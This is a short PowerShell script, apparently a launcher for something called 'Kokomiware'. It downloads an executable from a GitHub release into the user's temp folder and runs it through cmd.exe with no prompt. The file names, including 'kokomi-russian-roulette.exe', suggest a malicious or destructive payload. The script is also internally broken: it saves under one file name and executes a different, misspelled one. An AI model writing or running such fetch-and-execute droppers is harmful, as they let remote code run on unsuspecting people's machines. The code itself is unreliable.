#Direct Mode Kokomiware
function kokomiware {
  $DownloadUrl = "https://github.com/quantumwavves/Kokomiware/releases/download/alpha-release/kokomiware.exe"
  $filePath = "$env:temp\kokomiware.exe"
  if ([System.IO.File]::Exists($filePath)) {
    cmd.exe /c "$env:temp\kokomiware.exe"
 }
  else {
    Invoke-WebRequest -UseBasicParsing $DownloadUrl -OutFile "$env:temp\kokomi-russian-roulette.exe"
    Start-Sleep 2
    cmd.exe /c "$env:temp\kokomoware.exe"
  }
}
kokomiware
